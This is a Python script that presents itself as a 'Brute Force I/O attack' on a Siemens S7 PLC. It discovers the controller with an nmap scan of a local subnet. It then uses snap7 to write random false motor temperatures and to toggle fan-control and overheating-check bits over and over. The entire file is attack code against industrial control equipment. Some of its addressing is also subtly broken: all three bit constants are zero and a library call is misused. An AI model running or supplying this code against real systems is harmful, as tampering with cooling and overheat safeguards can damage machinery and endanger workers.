import snap7
import time
import random
import os
import subprocess

# Configuration (Modify as needed - find PLC IP if necessary)
PLC_IP = None # Will attempt to auto-discover if None
RACK = 0
SLOT = 1
MOTOR_TEMP_ADDRESS = 7  # MW7 (Motor Temperature Integer Address)
ACTIVATE_FAN_A_ADDRESS = 0 # M0.0 Activate_Fan_A Bool Address in memory
ACTIVATE_FAN_B_ADDRESS = 0 # M0.1 Activate_Fan_B Bool Address in memory
OVERHEATING_CHECK_ADDRESS = 0 # M0.2 Overheating_Check Bool address in memory

def find_plc_ip():
    """Attempts to discover the PLC's IP address using nmap."""
    try:
        # Assumes nmap is installed and in the system's PATH
        result = subprocess.run(['nmap', '-p', '102', '192.168.1.0/24'], capture_output=True, text=True) #  Adjust network range as needed
        output = result.stdout
        
        # Parse the nmap output to find a Siemens S7 PLC.  This is a *very* basic parsing.  Improve as needed.
        for line in output.splitlines():
            if "Siemens S7 PLC" in line:
                # Extract the IP address (crude, improve robustness)
                ip_address = line.split(" ")[0]
                return ip_address

        print("No Siemens S7 PLC found on the network.")
        return None
    except FileNotFoundError:
        print("nmap is not installed. Please install nmap and ensure it is in your system's PATH.")
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None

def read_motor_temp(plc):
    """Reads the motor temperature from the PLC."""
    try:
        motor_temp = plc.read_area(snap7.constants.areas['MK'], snap7.util.word_to_bytearray(MOTOR_TEMP_ADDRESS), MOTOR_TEMP_ADDRESS, 2)
        # Convert byte array to integer (assuming it's an integer)
        return snap7.util.get_int(motor_temp, 0)

    except Exception as e:
        print(f"Error reading motor temperature: {e}")
        return None

def write_motor_temp(plc, temp):
    """Writes a new motor temperature value to the PLC."""
    try:
         # Convert the integer temperature value to a byte array
        data = bytearray(2)  # 2 bytes for an integer
        snap7.util.set_int(data, 0, temp)  # Offset 0, write the integer value

        # Write the byte array to the PLC
        plc.write_area(snap7.constants.areas['MK'], snap7.util.word_to_bytearray(MOTOR_TEMP_ADDRESS), MOTOR_TEMP_ADDRESS, data) # changed MemoryArea to MK
        print(f"Successfully wrote motor temperature: {temp}")

    except Exception as e:
        print(f"Error writing motor temperature: {e}")

def toggle_fan_control(plc, address):
    """Toggles the specified fan control boolean in the PLC."""
    try:
        # Read the current state of the memory location
        byte_index = address // 8  # Calculate the byte index
        bit_index = address % 8   # Calculate the bit index

        data = plc.read_area(snap7.constants.areas['MK'], 0, byte_index, 1)
        current_value = snap7.util.get_bool(data, 0, bit_index)

        # Toggle the value
        new_value = not current_value
        snap7.util.set_bool(data, 0, bit_index, new_value)

        # Write the toggled value back to the PLC
        plc.write_area(snap7.constants.areas['MK'], 0, byte_index, data)

        tag_name = "Activate_Fan_A" if address == ACTIVATE_FAN_A_ADDRESS else "Activate_Fan_B" if address == ACTIVATE_FAN_B_ADDRESS else "Overheating_Check" if address == OVERHEATING_CHECK_ADDRESS else "Unknown"
        print(f"Successfully toggled {tag_name} to {new_value}")


    except Exception as e:
        print(f"Error toggling Fan Control {address}: {e}")

def main():
    global PLC_IP
    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("PLC IP address not found.  Exiting.")
            return

    plc = snap7.client.Client()

    try:
        plc.connect(PLC_IP, RACK, SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        # Brute Force I/O:  Change Motor Temp Randomly
        print("Starting Brute Force I/O attack...")
        for i in range(20):  # Repeat the attack a few times
            random_temp = random.randint(200, 450)  # Random temp between 200 and 450.  Adjust range as needed.
            write_motor_temp(plc, random_temp)
            time.sleep(0.5) # Wait a short time.  Experiment with different delays.

        # Brute Force I/O: Toggle Fan Control bits repetitively
        print("Starting Brute Force I/O attack on Fan Controls...")

        for i in range(10): # Repeat a few times.
           toggle_fan_control(plc, ACTIVATE_FAN_A_ADDRESS)
           time.sleep(0.3) #Short Delay

           toggle_fan_control(plc, ACTIVATE_FAN_B_ADDRESS)
           time.sleep(0.3)

           toggle_fan_control(plc, OVERHEATING_CHECK_ADDRESS)
           time.sleep(0.3)

        print("Brute Force I/O attack completed.")


    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")

if __name__ == "__main__":
    main()